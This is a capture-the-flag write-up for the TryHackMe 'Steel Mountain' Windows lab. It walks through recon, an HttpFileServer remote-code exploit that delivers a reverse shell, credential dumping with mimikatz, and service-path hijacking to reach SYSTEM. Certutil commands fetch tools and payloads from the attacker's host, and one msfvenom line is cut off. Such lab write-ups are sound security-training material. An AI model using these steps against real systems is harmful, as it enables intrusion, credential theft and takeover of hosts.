# SteelMountain [THM](https://tryhackme.com/room/steelmountain)
![steel-mountain-01](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Steel_Mountain/img/steel-mountain-01.png)

## recon 

Lets kick off enumeration with `nmap`:

`nmap -T4 -p- -A -Pn 10.10.80.108`

![nmap-res-02](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Steel_Mountain/img/nmap-res-02.png)

we have the following services:

+ An IIS V8.5 server on port 80.
+ An RPC endpoint on port 135.
+ NETBIOS-SSN on port 139.
+ SMB on port 445.
+ RDP V6.3 on port 3389.
+ An HTTPAPI on ports 5985 and 47001.
+ An HTTP File server on port 8080.

Trying to interact with the RDP fails on an authorization error:

`Failed to connect, CredSSP required by server`. 

This happens becuase our kali machine isnt setup with kerberos. 

Lets check the SMB, see if its misconfigured, maybe we can find credetials there. 
Then well take a look at the web server and the various API's.



### SMB 445

If we try to login anonymously with `smbclient` we get kicked out:

![smbclinet-fail-03](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Steel_Mountain/img/smbclient-fail-03.png)


If we try `crackmapexec` this fails as well:

![crackmapexec-fail-04](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Steel_Mountain/img/crackmapexec-fail-04.png)


Looks like a dead end, we need creds. Lets check the HTTP server. 



### HTTP 80

Navigating towards the site's URL `http://10.10.80.108`

![site-05](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Steel_Mountain/img/site-05.png)


Look empty. I've tried directory busting, it only leads to an `img` directory with noting interesting. 
Source code looks empty as well:

![site-source-06](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Steel_Mountain/img/site-source-06.png)

Lets take a look at the file server.


### HttpFileServer 8080


If we navigate towards the target URL `http://10.10.80.108:8080`

![file-server-07](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Steel_Mountain/img/file-server-07.png)


We have a search feature, and a login form, but we dont need to log in to search stuff. 
Searching yields nothing, but if we check for known vulnerabilities online we find something juicy:

![exploitdb-08](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Steel_Mountain/img/exploitdb-08.png)

[Source](https://www.exploit-db.com/exploits/39161)


Looks like Python 2, appears to be abusing the search feature:

![exploit-analyze-09](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Steel_Mountain/img/exploit-analyze-09.png)


Looks promising. Worth a shot. 


## Exploit

Here is the exploitation breakdown: 

1) Download the exploit to your kali, and make sure to update your IP and port:

![update-exploit-10](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Steel_Mountain/img/update-exploit-10.png)


2) Place a copy of `nc.exe` in a directory of your choosing and fire off an HTTP server on port 80

`python3 -m http.server 80` 

![http-server-11](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Steel_Mountain/img/http-server-11.png)


3) Start the listener with `nc -lvnp 8044`


4) Execute the exploit with `./exploit.py 10.10.8.108 8080`


5) Get a shell:

![shell-12](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Steel_Mountain/img/shell-12.png)


Lets get system!



## Privilege Escalation 

If we run `systeminfo`:

![sysinfo-13](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Steel_Mountain/img/sysinfo-13.png)


We are dealing with a MS server 2012 R2. Lets try searching for stored credentials.   

I tried manual searching with:

`findstr /spin "password" *.*`

I tried searching the regestry with:

`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`

I then tried [mimikatz](https://github.com/gentilkiwi/mimikatz)
Download the tool, transfer to the clinet via python web server and `certutil`.

I tried running `vault::cred`

![mimikatz-14](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Steel_Mountain/img/mimikatz-14.png)

Looks like a password. I tried connecting via the RDP, same error of:

`Failed to connect, CredSSP required by server`

I tried using the password to enumerate the smb with different tools like `enum4linux` and `smbclient`,
nothing interesting came up. 

Decided to shift gears and try [winpeas](https://github.com/carlospolop/PEASS-ng/releases/tag/20230731-452f0c44) We need the `winPEASx64.exe` binary. 

1) Transfer it to the clinet using a python server with:

`python3 -m http.server 80`

2) Download it to the target with:

`certutil -urlcache -f http://10.18.22.182/winPEASx64.exe winpeas.exe`

3) Execute `winpeas.exe`

![winpeas-15](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Steel_Mountain/img/winpeas-15.png)

We have an unquoted service with spaces, we can potentially hijack this with our own custom binary. 
Our user also has full write permission to this directory. 

Lets examine this process. First lets run `net start` to list all running processes:

![net-start-16](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Steel_Mountain/img/net-start-16.png)

Lets check its properties, primarly, under which user it runs. We can do this with:

`sc qc AdvancedSystemCareService9`

![sc-16](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Steel_Mountain/img/sc-16.png)

It runs as the system. We can abuse this to gain system access. 

1) Create venom 

`msfvenom -p windows/x64/re`


2) Stop the service on the target with:

`net stop AdvancedSystemCareService9`


3) Download the venom to the target with:

`certutil -urlcache -f http://10.18.22.182/ASCService.exe ASCService.exe`


4) Start the listener with:

`nc -lvnp 9009`


5) Start the service with:

`net start AdvancedSystemCareService9`


6) Get system:

![root-17](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Steel_Mountain/img/root-17.png)
